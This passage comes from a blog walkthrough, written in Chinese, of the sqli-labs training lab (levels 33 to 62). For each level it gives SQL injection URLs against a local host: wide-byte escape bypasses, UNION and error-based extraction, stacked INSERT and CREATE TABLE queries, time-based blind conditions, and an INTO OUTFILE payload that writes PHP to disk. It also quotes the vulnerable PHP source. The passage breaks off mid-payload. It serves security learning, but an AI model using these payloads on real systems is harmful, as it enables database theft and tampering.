class="line">http://127.0.0.1:8081/sqli-labs/Less-33/?id=-1%df&#x27;<span class="attribute">union</span> <span class="literal">select</span> <span class="number">1</span>,user(),<span class="number">3</span>--+</span><br></pre></td></tr></table></figure><h4 id="æºç åˆ†æ-31"><a href="#æºç åˆ†æ-31" class="headerlink" title="æºç åˆ†æ"></a>æºç åˆ†æ</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_addslashes</span>(<span class="params"><span class="variable">$string</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$string</span>= <span class="title function_ invoke__">addslashes</span>(<span class="variable">$string</span>);    </span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$string</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Less-34-Bypass-Add-SLASHES"><a href="#Less-34-Bypass-Add-SLASHES" class="headerlink" title="Less-34 Bypass Add SLASHES"></a>Less-34 Bypass Add SLASHES</h3><h4 id="æ‰‹åŠ¨æ³¨å…¥-35"><a href="#æ‰‹åŠ¨æ³¨å…¥-35" class="headerlink" title="æ‰‹åŠ¨æ³¨å…¥"></a>æ‰‹åŠ¨æ³¨å…¥</h4><p><img src="https://s2.loli.net/2022/05/17/sv6kSR8guHL12Dh.png" alt="34.png"></p><h3 id="Less-35-why-care-for-addslashes"><a href="#Less-35-why-care-for-addslashes" class="headerlink" title="Less-35 why care for addslashes()"></a>Less-35 why care for addslashes()</h3><h4 id="æ‰‹åŠ¨æ³¨å…¥-36"><a href="#æ‰‹åŠ¨æ³¨å…¥-36" class="headerlink" title="æ‰‹åŠ¨æ³¨å…¥"></a>æ‰‹åŠ¨æ³¨å…¥</h4><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/sqli-labs/Less-35/?id=-1 <span class="attribute">union</span> <span class="literal">select</span> <span class="number">1</span>,user(),<span class="number">3</span>;--+</span><br></pre></td></tr></table></figure><h4 id="æºç åˆ†æ-32"><a href="#æºç åˆ†æ-32" class="headerlink" title="æºç åˆ†æ"></a>æºç åˆ†æ</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_addslashes</span>(<span class="params"><span class="variable">$string</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$string</span> = <span class="title function_ invoke__">addslashes</span>(<span class="variable">$string</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$string</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Less-36-Bypass-MySQL-Real-Escape-String"><a href="#Less-36-Bypass-MySQL-Real-Escape-String" class="headerlink" title="Less-36 Bypass MySQL Real Escape String"></a>Less-36 Bypass MySQL Real Escape String</h3><h4 id="æ‰‹åŠ¨æ³¨å…¥-37"><a href="#æ‰‹åŠ¨æ³¨å…¥-37" class="headerlink" title="æ‰‹åŠ¨æ³¨å…¥"></a>æ‰‹åŠ¨æ³¨å…¥</h4><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/sqli-labs/Less-36/?id=-1%df&#x27;<span class="attribute">union</span> <span class="literal">select</span> <span class="number">1</span>,database(),<span class="number">3</span>--+</span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-36/?id=-1%EF%BF%BD&#x27;union <span class="literal">select</span> <span class="number">1</span>,user(),<span class="number">3</span>--+</span><br></pre></td></tr></table></figure><h4 id="æºç åˆ†æ-33"><a href="#æºç åˆ†æ-33" class="headerlink" title="æºç åˆ†æ"></a>æºç åˆ†æ</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_quotes</span>(<span class="params"><span class="variable">$con1</span>, <span class="variable">$string</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$string</span>=<span class="title function_ invoke__">mysqli_real_escape_string</span>(<span class="variable">$con1</span>, <span class="variable">$string</span>);    </span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$string</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Less-37-MySQL-real-escape-string"><a href="#Less-37-MySQL-real-escape-string" class="headerlink" title="Less-37- MySQL_real_escape_string"></a>Less-37- MySQL_real_escape_string</h3><h4 id="æ‰‹åŠ¨æ³¨å…¥-38"><a href="#æ‰‹åŠ¨æ³¨å…¥-38" class="headerlink" title="æ‰‹åŠ¨æ³¨å…¥"></a>æ‰‹åŠ¨æ³¨å…¥</h4><p>ç”¨burpå³å¯</p><h4 id="æºç åˆ†æ-34"><a href="#æºç åˆ†æ-34" class="headerlink" title="æºç åˆ†æ"></a>æºç åˆ†æ</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$uname</span> = <span class="title function_ invoke__">mysqli_real_escape_string</span>(<span class="variable">$con1</span>, <span class="variable">$uname1</span>);</span><br><span class="line"><span class="variable">$passwd</span>= <span class="title function_ invoke__">mysqli_real_escape_string</span>(<span class="variable">$con1</span>, <span class="variable">$passwd1</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$con1</span>, <span class="string">&quot;SET NAMES gbk&quot;</span>);</span><br><span class="line">@<span class="variable">$sql</span>=<span class="string">&quot;SELECT username, password FROM users WHERE username=&#x27;<span class="subst">$uname</span>&#x27; and password=&#x27;<span class="subst">$passwd</span>&#x27; LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure><h2 id="Page-3-Stacked-Injections"><a href="#Page-3-Stacked-Injections" class="headerlink" title="Page-3  (Stacked Injections)"></a>Page-3  (Stacked Injections)</h2><h3 id="Less-38-stacked-Query"><a href="#Less-38-stacked-Query" class="headerlink" title="Less-38 stacked Query"></a>Less-38 stacked Query</h3><h4 id="æ‰‹åŠ¨æ³¨å…¥-39"><a href="#æ‰‹åŠ¨æ³¨å…¥-39" class="headerlink" title="æ‰‹åŠ¨æ³¨å…¥"></a>æ‰‹åŠ¨æ³¨å…¥</h4><p>åŠ å…¥ä¸€æ¡æ•°æ®</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/sqli-labs/Less-38/?id=1&#x27;;<span class="attribute">insert</span> into users(id,username,password) values (<span class="string">&#x27;38&#x27;</span>,<span class="string">&#x27;less38&#x27;</span>,<span class="string">&#x27;hello&#x27;</span>)--+</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/05/17/FTXO3ltsWAHe6aS.png" alt="38.png"></p><h3 id="Less-39-stacked-Query-Intiger-type"><a href="#Less-39-stacked-Query-Intiger-type" class="headerlink" title="Less-39 stacked Query Intiger type"></a>Less-39 stacked Query Intiger type</h3><h4 id="æ‰‹åŠ¨æ³¨å…¥-40"><a href="#æ‰‹åŠ¨æ³¨å…¥-40" class="headerlink" title="æ‰‹åŠ¨æ³¨å…¥"></a>æ‰‹åŠ¨æ³¨å…¥</h4><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/sqli-labs/Less-39/?id=1;<span class="attribute">insert</span> into users(id,username,password) values (<span class="string">&#x27;39&#x27;</span>,<span class="string">&#x27;less39&#x27;</span>,<span class="string">&#x27;hello&#x27;</span>)--+</span><br></pre></td></tr></table></figure><h3 id="Less-40-stacked-Query-String-type-Blind"><a href="#Less-40-stacked-Query-String-type-Blind" class="headerlink" title="Less-40 stacked Query String type Blind"></a>Less-40 stacked Query String type Blind</h3><h4 id="æ‰‹åŠ¨æ³¨å…¥-41"><a href="#æ‰‹åŠ¨æ³¨å…¥-41" class="headerlink" title="æ‰‹åŠ¨æ³¨å…¥"></a>æ‰‹åŠ¨æ³¨å…¥</h4><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/sqli-labs/Less-40/?id=1&#x27;); <span class="attribute">insert</span> into users(id,username, password) values (<span class="string">&#x27;40&#x27;</span>,<span class="string">&#x27;less40&#x27;</span>,<span class="string">&#x27;hello&#x27;</span>)--+</span><br></pre></td></tr></table></figure><h3 id="Less-41-stacked-Query-Intiger-type-blind"><a href="#Less-41-stacked-Query-Intiger-type-blind" class="headerlink" title="Less-41 stacked Query Intiger type blind"></a>Less-41 stacked Query Intiger type blind</h3><h4 id="æ‰‹åŠ¨æ³¨å…¥-42"><a href="#æ‰‹åŠ¨æ³¨å…¥-42" class="headerlink" title="æ‰‹åŠ¨æ³¨å…¥"></a>æ‰‹åŠ¨æ³¨å…¥</h4><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/sqli-labs/Less-41/?id=1;<span class="attribute">insert</span> into users(id,username,password) values (<span class="string">&#x27;41&#x27;</span>,<span class="string">&#x27;less41&#x27;</span>,<span class="string">&#x27;hello&#x27;</span>)--+</span><br></pre></td></tr></table></figure><h4 id="æºç åˆ†æ-35"><a href="#æºç åˆ†æ-35" class="headerlink" title="æºç åˆ†æ"></a>æºç åˆ†æ</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=<span class="subst">$id</span> LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure><h3 id="Less-42-Stacked-Query-error-based"><a href="#Less-42-Stacked-Query-error-based" class="headerlink" title="Less-42 - Stacked Query error based"></a>Less-42 - Stacked Query error based</h3><h4 id="æ‰‹åŠ¨æ³¨å…¥-43"><a href="#æ‰‹åŠ¨æ³¨å…¥-43" class="headerlink" title="æ‰‹åŠ¨æ³¨å…¥"></a>æ‰‹åŠ¨æ³¨å…¥</h4><p><code>username</code>:admin </p><p><code>Password</code>:câ€™;create table less42 like usersâ€“+</p><p><img src="https://s2.loli.net/2022/05/17/5ovkQSFNKgiWfdH.png" alt="42.png"></p><h3 id="less43-POST-Error-based-String-Stacked-with-tiwst-POSTå‹åŸºäºé”™è¯¯çš„å †å å˜å½¢å­—ç¬¦å‹æ³¨å…¥"><a href="#less43-POST-Error-based-String-Stacked-with-tiwst-POSTå‹åŸºäºé”™è¯¯çš„å †å å˜å½¢å­—ç¬¦å‹æ³¨å…¥" class="headerlink" title="less43 POST -Error based -String -Stacked with tiwst(POSTå‹åŸºäºé”™è¯¯çš„å †å å˜å½¢å­—ç¬¦å‹æ³¨å…¥)"></a>less43 POST -Error based -String -Stacked with tiwst(POSTå‹åŸºäºé”™è¯¯çš„å †å å˜å½¢å­—ç¬¦å‹æ³¨å…¥)</h3><h4 id="æ‰‹åŠ¨æ³¨å…¥-44"><a href="#æ‰‹åŠ¨æ³¨å…¥-44" class="headerlink" title="æ‰‹åŠ¨æ³¨å…¥"></a>æ‰‹åŠ¨æ³¨å…¥</h4><p><code>username</code>:admin </p><p><code>Password</code>:câ€™);create table less43 like usersâ€“+</p><h3 id="Less-44-Stacked-Query-blind"><a href="#Less-44-Stacked-Query-blind" class="headerlink" title="Less-44 - Stacked Query blind"></a>Less-44 - Stacked Query blind</h3><h4 id="æ‰‹åŠ¨æ³¨å…¥-45"><a href="#æ‰‹åŠ¨æ³¨å…¥-45" class="headerlink" title="æ‰‹åŠ¨æ³¨å…¥"></a>æ‰‹åŠ¨æ³¨å…¥</h4><p><code>username</code>:admin </p><p><code>Password</code>:câ€™;create table less44 like usersâ€“+</p><h3 id="less-45-åŸºäºæŠ¥é”™çš„passwordå¤„çš„â€™-é—­åˆæ³¨å…¥"><a href="#less-45-åŸºäºæŠ¥é”™çš„passwordå¤„çš„â€™-é—­åˆæ³¨å…¥" class="headerlink" title="less-45 åŸºäºæŠ¥é”™çš„passwordå¤„çš„â€™)é—­åˆæ³¨å…¥"></a>less-45 åŸºäºæŠ¥é”™çš„passwordå¤„çš„â€™)é—­åˆæ³¨å…¥</h3><h4 id="æ‰‹åŠ¨æ³¨å…¥-46"><a href="#æ‰‹åŠ¨æ³¨å…¥-46" class="headerlink" title="æ‰‹åŠ¨æ³¨å…¥"></a>æ‰‹åŠ¨æ³¨å…¥</h4><p><code>username</code>:admin </p><p><code>Password</code>:câ€™);create table less45 like usersâ€“+</p><h3 id="less-46-ORDER-BY-Error-Numeric"><a href="#less-46-ORDER-BY-Error-Numeric" class="headerlink" title="less-46 ORDER BY-Error-Numeric"></a>less-46 ORDER BY-Error-Numeric</h3><h4 id="æ‰‹åŠ¨æ³¨å…¥-47"><a href="#æ‰‹åŠ¨æ³¨å…¥-47" class="headerlink" title="æ‰‹åŠ¨æ³¨å…¥"></a>æ‰‹åŠ¨æ³¨å…¥</h4><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="comment">#æŠ¥é”™æ³¨å…¥</span></span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-46/?sort=(<span class="attribute">select</span> count(*) from information_schema.columns group by concat(0x3a,0x3a,(<span class="literal">select</span> user()),0x3a,0x3a,floor(rand()*<span class="number">2</span>)))</span><br><span class="line"><span class="comment">#ä¹Ÿå¯ä»¥å¯¼å…¥å¯¼å‡ºæ–‡ä»¶into outfile å‚æ•°</span></span><br></pre></td></tr></table></figure><h4 id="æºç åˆ†æ-36"><a href="#æºç åˆ†æ-36" class="headerlink" title="æºç åˆ†æ"></a>æºç åˆ†æ</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM users ORDER BY <span class="subst">$id</span>&quot;</span>;</span><br></pre></td></tr></table></figure><h3 id="Less-47-ORDER-BY-Clause-Error-Single-quote"><a href="#Less-47-ORDER-BY-Clause-Error-Single-quote" class="headerlink" title="Less-47 - ORDER BY Clause-Error-Single quote"></a>Less-47 - ORDER BY Clause-Error-Single quote</h3><h4 id="æ‰‹åŠ¨æ³¨å…¥-48"><a href="#æ‰‹åŠ¨æ³¨å…¥-48" class="headerlink" title="æ‰‹åŠ¨æ³¨å…¥"></a>æ‰‹åŠ¨æ³¨å…¥</h4><p><img src="https://s2.loli.net/2022/05/17/qi8F1NCMIayvPrH.png" alt="47.png"></p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/sqli-labs/Less-47/?sort=1&#x27;<span class="attribute">into</span> outfile <span class="string">&quot;æ–‡ä»¶åœ°å€&quot;</span>lines terminated by 0x3c3f70687020706870696e666f28293b3f3e2020--+</span><br></pre></td></tr></table></figure><h3 id="Less-48-ORDER-BY-Clause-Blind-based"><a href="#Less-48-ORDER-BY-Clause-Blind-based" class="headerlink" title="Less-48 - ORDER BY Clause Blind based"></a>Less-48 - ORDER BY Clause Blind based</h3><h4 id="æ‰‹åŠ¨æ³¨å…¥-49"><a href="#æ‰‹åŠ¨æ³¨å…¥-49" class="headerlink" title="æ‰‹åŠ¨æ³¨å…¥"></a>æ‰‹åŠ¨æ³¨å…¥</h4><p>å¸ƒå°”ç›²æ³¨ã€å»¶æ—¶æ³¨å…¥åŠå¯¹æ–‡ä»¶æ“ä½œå‡å¯ï¼Œé™¤ä¸èƒ½æŠ¥é”™æ³¨å…¥å¤–åŒLess-46</p><h3 id="Less49-ORDER-BY-Clause-Blind-based"><a href="#Less49-ORDER-BY-Clause-Blind-based" class="headerlink" title="Less49 - ORDER BY Clause Blind based"></a>Less49 - ORDER BY Clause Blind based</h3><h4 id="æ‰‹åŠ¨æ³¨å…¥-50"><a href="#æ‰‹åŠ¨æ³¨å…¥-50" class="headerlink" title="æ‰‹åŠ¨æ³¨å…¥"></a>æ‰‹åŠ¨æ³¨å…¥</h4><p>é™¤ä¸èƒ½æŠ¥é”™æ³¨å…¥å¤–åŒLess-47</p><h3 id="Less50-ORDER-BY-Clause-Blind-based"><a href="#Less50-ORDER-BY-Clause-Blind-based" class="headerlink" title="Less50 - ORDER BY Clause Blind based"></a>Less50 - ORDER BY Clause Blind based</h3><h4 id="æ‰‹åŠ¨æ³¨å…¥-51"><a href="#æ‰‹åŠ¨æ³¨å…¥-51" class="headerlink" title="æ‰‹åŠ¨æ³¨å…¥"></a>æ‰‹åŠ¨æ³¨å…¥</h4><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/sqli-labs/Less-50/?sort=1;<span class="attribute">create</span> table less50 like users</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/05/17/VZUAQPF5jBvIJ8r.png" alt="50.png"></p><h3 id="Less-51-ORDER-BY-Clause-Blind-based"><a href="#Less-51-ORDER-BY-Clause-Blind-based" class="headerlink" title="Less-51 - ORDER BY Clause Blind based"></a>Less-51 - ORDER BY Clause Blind based</h3><h4 id="æ‰‹åŠ¨æ³¨å…¥-52"><a href="#æ‰‹åŠ¨æ³¨å…¥-52" class="headerlink" title="æ‰‹åŠ¨æ³¨å…¥"></a>æ‰‹åŠ¨æ³¨å…¥</h4><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/sqli-labs/Less-51/?sort=1&#x27;;<span class="attribute">create</span> table less51 like users--+</span><br></pre></td></tr></table></figure><h3 id="Less-52-ORDER-BY-Clause-Blind-based"><a href="#Less-52-ORDER-BY-Clause-Blind-based" class="headerlink" title="Less-52 - ORDER BY Clause Blind based"></a>Less-52 - ORDER BY Clause Blind based</h3><h4 id="æ‰‹åŠ¨æ³¨å…¥-53"><a href="#æ‰‹åŠ¨æ³¨å…¥-53" class="headerlink" title="æ‰‹åŠ¨æ³¨å…¥"></a>æ‰‹åŠ¨æ³¨å…¥</h4><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/sqli-labs/Less-52/?sort=1;<span class="attribute">create</span> table less52 like users</span><br></pre></td></tr></table></figure><h3 id="Less-53-ORDER-BY-Clause-Blind-based"><a href="#Less-53-ORDER-BY-Clause-Blind-based" class="headerlink" title="Less-53 - ORDER BY Clause Blind based"></a>Less-53 - ORDER BY Clause Blind based</h3><h4 id="æ‰‹åŠ¨æ³¨å…¥-54"><a href="#æ‰‹åŠ¨æ³¨å…¥-54" class="headerlink" title="æ‰‹åŠ¨æ³¨å…¥"></a>æ‰‹åŠ¨æ³¨å…¥</h4><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/sqli-labs/Less-53/?sort=1&#x27;;<span class="attribute">create</span> table less53 like users--+</span><br></pre></td></tr></table></figure><h2 id="Page-4-Challenges"><a href="#Page-4-Challenges" class="headerlink" title="Page-4  (Challenges)"></a>Page-4  (Challenges)</h2><h3 id="Less-54-Challenge-1"><a href="#Less-54-Challenge-1" class="headerlink" title="Less-54:Challenge-1"></a>Less-54:Challenge-1</h3><h4 id="æ‰‹åŠ¨æ³¨å…¥-55"><a href="#æ‰‹åŠ¨æ³¨å…¥-55" class="headerlink" title="æ‰‹åŠ¨æ³¨å…¥"></a>æ‰‹åŠ¨æ³¨å…¥</h4><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="comment">#è·å–è¡¨åcul94axau9</span></span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-54/index.php?id=-1&#x27;<span class="attribute">union</span> <span class="literal">select</span> <span class="number">1</span>,<span class="number">2</span>,group_concat(table_name) from information_schema.tables where table_schema=<span class="string">&#x27;challenges&#x27;</span>--+</span><br><span class="line"><span class="comment">#è·å–åˆ—åid,sessid,secret_B27K,tryy</span></span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-54/index.php?id=-1&#x27;union <span class="literal">select</span> <span class="number">1</span>,<span class="number">2</span>,group_concat(column_name) from information_schema.columns where table_name=<span class="string">&#x27;cul94axau9&#x27;</span>--+</span><br><span class="line"><span class="comment">#è·å–ç­”æ¡ˆ</span></span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-54/index.php?id=-1&#x27;union <span class="literal">select</span> <span class="number">1</span>,<span class="number">2</span>,group_concat(secret_B27K) from challenges.cul94axau9--+</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/05/17/1aoe3HdJVti8zqP.png" alt="54.png"></p><h3 id="Less-55-Challenge-2"><a href="#Less-55-Challenge-2" class="headerlink" title="Less-55:Challenge-2"></a>Less-55:Challenge-2</h3><h4 id="æ‰‹åŠ¨æ³¨å…¥-56"><a href="#æ‰‹åŠ¨æ³¨å…¥-56" class="headerlink" title="æ‰‹åŠ¨æ³¨å…¥"></a>æ‰‹åŠ¨æ³¨å…¥</h4><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="comment">#è·å–è¡¨åk6cm9525rm</span></span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-55/index.php?id=-1)<span class="attribute">union</span> <span class="literal">select</span> <span class="number">1</span>,<span class="number">2</span>,group_concat(table_name) from information_schema.tables where table_schema=<span class="string">&#x27;challenges&#x27;</span>--+</span><br><span class="line"><span class="comment">#è·å–åˆ—åid,sessid,secret_6TMN,tryy</span></span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-55/index.php?id=-1)union <span class="literal">select</span> <span class="number">1</span>,<span class="number">2</span>,group_concat(column_name) from information_schema.columns where table_name=<span class="string">&#x27;k6cm9525rm&#x27;</span>--+</span><br><span class="line"><span class="comment">#è·å–ç­”æ¡ˆ</span></span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-55/index.php?id=-1)union <span class="literal">select</span> <span class="number">1</span>,<span class="number">2</span>,group_concat(secret_6TMN) from challenges.k6cm9525rm--+</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/05/17/ScPXqw9oER13LjV.png" alt="55.png"></p><h3 id="Less-56-Challenge-3"><a href="#Less-56-Challenge-3" class="headerlink" title="Less-56:Challenge-3"></a>Less-56:Challenge-3</h3><h4 id="æ‰‹åŠ¨æ³¨å…¥-57"><a href="#æ‰‹åŠ¨æ³¨å…¥-57" class="headerlink" title="æ‰‹åŠ¨æ³¨å…¥"></a>æ‰‹åŠ¨æ³¨å…¥</h4><p>æœ¬å…³ä½¿ç”¨<code>(&#39;&#39;)</code>å¤„ç†è¾“å…¥</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/sqli-labs/Less-56/?id=-1&#x27;)<span class="attribute">union</span> <span class="literal">select</span> <span class="number">1</span>,<span class="number">2</span>,group_concat(table_name) from information_schema.tables where table_schema=<span class="string">&#x27;challenges&#x27;</span>--+</span><br></pre></td></tr></table></figure><h4 id="æºç åˆ†æ-37"><a href="#æºç åˆ†æ-37" class="headerlink" title="æºç åˆ†æ"></a>æºç åˆ†æ</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM security.users WHERE id=(&#x27;<span class="subst">$id</span>&#x27;) LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure><h3 id="Less-57-Challenge-4"><a href="#Less-57-Challenge-4" class="headerlink" title="Less-57:Challenge-4"></a>Less-57:Challenge-4</h3><h4 id="æ‰‹åŠ¨æ³¨å…¥-58"><a href="#æ‰‹åŠ¨æ³¨å…¥-58" class="headerlink" title="æ‰‹åŠ¨æ³¨å…¥"></a>æ‰‹åŠ¨æ³¨å…¥</h4><p>æœ¬å…³ä½¿ç”¨<code>&quot;&quot;</code>å¤„ç†è¾“å…¥</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/sqli-labs/Less-57/?id=-1&quot;<span class="attribute">union</span> <span class="literal">select</span> <span class="number">1</span>,<span class="number">2</span>,group_concat(table_name) from information_schema.tables where table_schema=<span class="string">&#x27;challenges&#x27;</span>--+</span><br></pre></td></tr></table></figure><h4 id="æºç åˆ†æ-38"><a href="#æºç åˆ†æ-38" class="headerlink" title="æºç åˆ†æ"></a>æºç åˆ†æ</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$id</span>= <span class="string">&#x27;&quot;&#x27;</span>.<span class="variable">$id</span>.<span class="string">&#x27;&quot;&#x27;</span>;</span><br><span class="line"><span class="comment">// Querry DB to get the correct output</span></span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM security.users WHERE id=<span class="subst">$id</span> LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure><h3 id="Less-58-Challenge-5"><a href="#Less-58-Challenge-5" class="headerlink" title="Less-58:Challenge-5"></a>Less-58:Challenge-5</h3><h4 id="æ‰‹åŠ¨æ³¨å…¥-59"><a href="#æ‰‹åŠ¨æ³¨å…¥-59" class="headerlink" title="æ‰‹åŠ¨æ³¨å…¥"></a>æ‰‹åŠ¨æ³¨å…¥</h4><p>æŠ¥é”™æ³¨å…¥</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/sqli-labs/Less-58/?id=-1&#x27;<span class="attribute">union</span> <span class="literal">select</span> extractvalue(<span class="number">1</span>,concat(0x7e,(<span class="literal">select</span> group_concat(table_name) from information_schema.tables where table_schema=<span class="string">&#x27;challenges&#x27;</span>),0x7e))--+</span><br></pre></td></tr></table></figure><h3 id="Less-59-Challenge-6"><a href="#Less-59-Challenge-6" class="headerlink" title="Less-59:Challenge-6"></a>Less-59:Challenge-6</h3><h4 id="æ‰‹åŠ¨æ³¨å…¥-60"><a href="#æ‰‹åŠ¨æ³¨å…¥-60" class="headerlink" title="æ‰‹åŠ¨æ³¨å…¥"></a>æ‰‹åŠ¨æ³¨å…¥</h4><p>æŠ¥é”™æ³¨å…¥</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/sqli-labs/Less-59/?id=-1 <span class="attribute">union</span> <span class="literal">select</span> extractvalue(<span class="number">1</span>,concat(0x7e,(<span class="literal">select</span> group_concat(table_name) from information_schema.tables where table_schema=<span class="string">&#x27;challenges&#x27;</span>),0x7e))--+</span><br></pre></td></tr></table></figure><h4 id="æºç åˆ†æ-39"><a href="#æºç åˆ†æ-39" class="headerlink" title="æºç åˆ†æ"></a>æºç åˆ†æ</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM security.users WHERE id=<span class="subst">$id</span> LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure><h3 id="Less-60-Challenge-7"><a href="#Less-60-Challenge-7" class="headerlink" title="Less-60:Challenge-7"></a>Less-60:Challenge-7</h3><h4 id="æ‰‹åŠ¨æ³¨å…¥-61"><a href="#æ‰‹åŠ¨æ³¨å…¥-61" class="headerlink" title="æ‰‹åŠ¨æ³¨å…¥"></a>æ‰‹åŠ¨æ³¨å…¥</h4><p>æŠ¥é”™æ³¨å…¥</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/sqli-labs/Less-60/?id=-1&quot;)<span class="attribute">union</span> <span class="literal">select</span> extractvalue(<span class="number">1</span>,concat(0x7e,(<span class="literal">select</span> group_concat(table_name) from information_schema.tables where table_schema=<span class="string">&#x27;challenges&#x27;</span>),0x7e))--+</span><br></pre></td></tr></table></figure><h4 id="æºç åˆ†æ-40"><a href="#æºç åˆ†æ-40" class="headerlink" title="æºç åˆ†æ"></a>æºç åˆ†æ</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$id</span> = <span class="string">&#x27;(&quot;&#x27;</span>.<span class="variable">$id</span>.<span class="string">&#x27;&quot;)&#x27;</span>;</span><br><span class="line"><span class="comment">// Querry DB to get the correct output</span></span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM security.users WHERE id=<span class="subst">$id</span> LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure><h3 id="Less-61-Challenge-8"><a href="#Less-61-Challenge-8" class="headerlink" title="Less-61:Challenge-8"></a>Less-61:Challenge-8</h3><h4 id="æ‰‹åŠ¨æ³¨å…¥-62"><a href="#æ‰‹åŠ¨æ³¨å…¥-62" class="headerlink" title="æ‰‹åŠ¨æ³¨å…¥"></a>æ‰‹åŠ¨æ³¨å…¥</h4><p>æŠ¥é”™æ³¨å…¥</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/sqli-labs/Less-61/?id=-1&#x27;))<span class="attribute">union</span> <span class="literal">select</span> extractvalue(<span class="number">1</span>,concat(0x7e,(<span class="literal">select</span> group_concat(table_name) from information_schema.tables where table_schema=<span class="string">&#x27;challenges&#x27;</span>),0x7e))--+</span><br></pre></td></tr></table></figure><h4 id="æºç åˆ†æ-41"><a href="#æºç åˆ†æ-41" class="headerlink" title="æºç åˆ†æ"></a>æºç åˆ†æ</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM security.users WHERE id=((&#x27;<span class="subst">$id</span>&#x27;)) LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure><h3 id="Less-62-Challenge-9"><a href="#Less-62-Challenge-9" class="headerlink" title="Less-62:Challenge-9"></a>Less-62:Challenge-9</h3><h4 id="æ‰‹åŠ¨æ³¨å…¥-63"><a href="#æ‰‹åŠ¨æ³¨å…¥-63" class="headerlink" title="æ‰‹åŠ¨æ³¨å…¥"></a>æ‰‹åŠ¨æ³¨å…¥</h4><p>å»¶æ—¶æ³¨å…¥ï¼ˆå¯ä»¥ä½¿ç”¨è„šæœ¬ï¼‰</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/sqli-labs/Less-61/?id=1&#x27;)<span class="attribute">and</span> If(ascii(substr((<span class="literal">select</span> group_concat(table_name) from information_schema.tables where table_schema=<span class="string">&#x27;challenges&#x27;</span>),<span class="number">1</span>,<span class="number">1</span>))=<span class="number">79</span>,<span 